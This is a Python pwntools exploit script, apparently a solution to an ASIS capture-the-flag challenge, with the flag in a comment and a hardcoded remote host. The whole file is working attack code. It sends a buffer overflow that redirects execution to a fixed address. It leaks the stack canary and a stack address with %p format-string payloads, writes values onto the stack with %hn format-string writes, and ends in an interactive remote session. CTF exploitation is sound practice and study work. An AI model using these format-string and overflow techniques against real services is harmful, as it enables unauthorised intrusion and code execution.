#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# ASIS{_ASIS_N3W_pwn_1S_goblin_pwn4b13!}

#e = ELF('')
#l = ELF('')

context.arch = 'amd64'

#y = process( './secretgarden' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
#print util.proc.pidof(y)

magic = 0x40087a

host , port = '146.185.132.36' , 12431
#host , port = '192.168.78.141' , 4000
y = remote( host , port )

#%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.!!!!%p!!!

cre = '7h15_15_v3ry_53cr37_1_7h1nk'

#y.recvuntil(':')
y.sendafter(':' , cre + 'D' * ( 0x28 - len(cre) ) + 'EEEEEEEE' + 'RBBBBBBP' + p64( magic ) )

y.sendlineafter('tion' , '1')
y.send( 'a' * 0x100 + '%p.' * 136 + 'cana%p\n' + 'yuawn%p\n' )

y.recvuntil('cana')
canary = p64( int( y.recvline() , 16 ) )
log.info( 'canary -> {}'.format( hex( u64( canary ) ) ) )
log.info( 'left -> {} right -> {}'.format( hex( u32( canary[:4] ) ) , hex( u32( canary[4:] ) ) ) )

y.recvuntil('yuawn')
stk = int( y.recvline() , 16 ) - 0x8
log.info( 'stk -> {}'.format( hex( stk ) ) )

# 0x100 -> 40 
# 65 , 66 , 67
p = '%p.' * 66

p = '%.{}x%65$hn'.format( u32( canary[:2].ljust(4,'\x00') ) - 0x102 )
#p += '%.{}x%65$hn'.format( u32( canary[:2].ljust(4,'\x00') ) - 0x102 )
#p += '%.{}x%65$hn'.format( u32( canary[:2].ljust(4,'\x00') ) - 0x102 )
#p += '%.{}x%65$hn'.format( u32( canary[:2].ljust(4,'\x00') ) - 0x102 )

print p

y.sendlineafter('tion' , '1')
y.send( 'a' * 0x102 + p + 'b' * ( 198 - len(p) ) + p64( stk ) + p64( stk + 2 ) + p64( stk + 4 ) +  p64( stk + 6 )  )
#y.send( 'a' * 0x100 + 'bbbbcccc' + '%p.' * 40 )

p = '%.{}x%66$hn'.format( u32( canary[2:4].ljust(4,'\x00') ) - 0x102 )
print p
y.sendlineafter('tion' , '1')
y.send( 'a' * 0x102 + p + 'b' * ( 198 - len(p) ) + p64( stk ) + p64( stk + 2 ) + p64( stk + 4 ) +  p64( stk + 6 ) )


p = '%.{}x%67$hn'.format( u32( canary[4:6].ljust(4,'\x00') ) - 0x102 )
y.sendlineafter('tion' , '1')
y.send( 'a' * 0x102 + p + 'b' * ( 198 - len(p) ) + p64( stk ) + p64( stk + 2 ) + p64( stk + 4 ) +  p64( stk + 6 ) )

p = '%.{}x%68$hn'.format( u32( canary[6:].ljust(4,'\x00') ) - 0x102 )
y.sendlineafter('tion' , '1')
y.send( 'a' * 0x102 + p + 'b' * ( 198 - len(p) ) + p64( stk ) + p64( stk + 2 ) + p64( stk + 4 ) +  p64( stk + 6 ) )

y.sendlineafter('action' , '1')
y.send( 'a' * 0x100 + '%p.' * 136 + 'cana%p\n' + 'yuawn%p\n' + '%p.' * 100 )

y.sendlineafter('action' , '0')



y.interactive()